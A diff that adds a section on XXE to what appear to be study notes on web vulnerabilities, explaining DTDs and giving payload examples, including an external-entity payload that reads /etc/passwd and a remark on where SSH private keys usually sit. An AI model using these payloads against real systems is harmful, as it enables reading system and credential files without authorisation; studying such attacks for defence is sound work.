@@ -72,6 +72,22 @@
 					`<subject>About XXE</subject>`
 					`<text>Teach about XXE</text>`
 				  `</mail>`
+		- **DTD (Document Type Definition):**
+			- Defines the structure and the legal elements and attributes of an XML document.
+			- Used to validate the information of an XML document against the defined rules.
+		- **Payload examples:**
+			- Simple payload:
+				 `<!DOCTYPE replace [<!ENTITY name "feast"> ]>`
+				 `<userInfo>`
+					 `<firstName>falcon</firstName>`
+					 `<lastName>&name;</lastName>`
+				 `</userInfo>`
+				 - Defining an Entity called `name` and assigning it a value of `feast`, and later, used that entity in the code.
+			- Payload to read some file:
+				`<?xml version="1.0"?>`
+				`<!DOCTYPE root [<!ENTITY read SYSTEM 'file:///etc/passwd'>]>`
+				`<root>&read;</root>`
+		- **NOTE:** Common location for `ssh` keys is `/home/<user>/.ssh/id_rsa`.
 - ## Broken Access Control
 - ## Security Misconfiguration
 - ## Cross-site Scripting
